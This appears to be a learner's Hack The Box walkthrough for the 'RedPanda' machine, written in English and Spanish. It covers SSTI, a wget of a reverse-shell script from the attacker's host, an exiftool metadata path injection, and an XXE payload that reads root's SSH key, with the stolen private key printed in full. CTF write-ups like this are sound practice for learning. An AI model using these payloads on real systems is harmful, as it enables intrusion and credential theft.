@@ -1,0 +1,96 @@
+
+Helped me a lot (aka: gave me the solution) ---->https://gatogamer1155.github.io/hackthebox/redpanda/
+It took me a day to pwned it
+
+nmap output:
+	22 open ssh
+	8080 open http-proxy
+gobuster: no output
+whatweb: Spring Boot service
+
+Vulnerability: Server Side Template Injection (SSTI)
+I used a python payload I found on https://gatogamer1155.github.io/hackthebox/redpanda/
+
+$ python3 payload.py 
+#Gave me prompt where I could reach user.txt
+$ cat /opt/panda_search/src/main/java/com/panda_search/htb/panda_search/MainController.java
+#Here were the credentials form my user
+$wget http://10.10.16.23:8000/sell2.py
+#I transfered a file with a python script to get a reverse shell
+$chmod 755 sell2.py
+#This gave the file permision to be executable (I dont really know if this was necessary)
+$python3 sell2.py 
+#Now I get a reverse shell on netcat
+
+ar70n@Kali $: wget (a random jpg image) gaton.jpg
+ar70n@kali $: exiftool -Artist="../home/woodenk/privesc" gaton.jpg
+#Had to create the privesc/ directory previously.I dont know exactly what this command did, supposely: 
+#"Mirando esta configuración (I couldnt find that configuration file) podemos inyectar en el campo "Artist", una ruta donde estará el xml, esto en una imagen cualquiera que despues subiremos a la máquina"
+ar70n@kali $:  scp gaton.jpg woodenk@10.10.11.170:.
+#I think this uploaded the file to the machine
+#A continuación crearemos en el home un archivo xml que apunte a la id_rsa de root, esto con el nombre definido en la imagen más _creds.xml que es lo suma el archivo que encontramos
+
+woodenk@redpanda:~$ cat privesc_creds.xml
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///root/.ssh/id_rsa"> ]>
+<credits>
+  <author>damian</author>
+  <image>
+    <uri>/../../../../../../../home/woodenk/gaton.jpg</uri>
+    <hello>&ent;</hello>
+    <views>0</views>
+  </image>
+  <totalviews>0</totalviews>
+</credits>
+Ahora nos queda hacer una petición curl con el formato que vimos en el archivo como User-Agent
+
+ar70n@kali $: curl http://10.10.11.170:8080 -H "User-Agent: ||/../../../../../../../home/woodenk/gaton.jpg"
+#Finalmente exportar el xml desde /stats para que tome nuestro archivo
+#Después de unos segundos si revisamos el xml tendra la id_rsa de root
+
+woodenk@redpanda:~$ cat privesc_creds.xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!--?xml version="1.0" ?-->
+<!DOCTYPE replace>
+<credits>
+  <author>damian</author>
+  <image>
+    <uri>/../../../../../../../home/woodenk/gato.jpg</uri>
+    <hello>
+-----BEGIN OPENSSH PRIVATE KEY-----
+b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
+QyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQAAAJBRbb26UW29
+ugAAAAtzc2gtZWQyNTUxOQAAACDeUNPNcNZoi+AcjZMtNbccSUcDUZ0OtGk+eas+bFezfQ
+AAAECj9KoL1KnAlvQDz93ztNrROky2arZpP8t8UgdfLI0HvN5Q081w1miL4ByNky01txxJ
+RwNRnQ60aT55qz5sV7N9AAAADXJvb3RAcmVkcGFuZGE=
+-----END OPENSSH PRIVATE KEY-----
+</hello>
+    <views>3</views>
+  </image>
+  <totalviews>3</totalviews>
+</credits>
+
+#Con esta pequeña id_rsa podemos finalmente conectarnos por ssh y visualizar la flag
+#I copied the ssh key, created a file named "id_rsa" moved it to ~/.ssh
+ar70n@kali $: chmod 400 ~/.ssh/id_rsa
+#This was necessary because until I did this, this showed up to me when trying to execute "ar70n@kali $: ssh root@10.10.11.170 -i id_rsa":
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Permissions 0644 for 'id_rsa' are too open.
+It is required that your private key files are NOT accessible by others.
+This private key will be ignored.
+Load key "id_rsa": bad permissions
+root@10.10.11.170's password: 
+
+
+ar70n@kali $: ssh root@10.10.11.170 -i id_rsa
+root@redpanda:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@redpanda:~# hostname -I
+10.10.11.170 dead:beef::250:56ff:feb9:6df0 
+root@redpanda:~# cat root.txt 
+b93*************************5de
+root@redpanda:~#
+#I really need to improve my walkthrough files
+#END
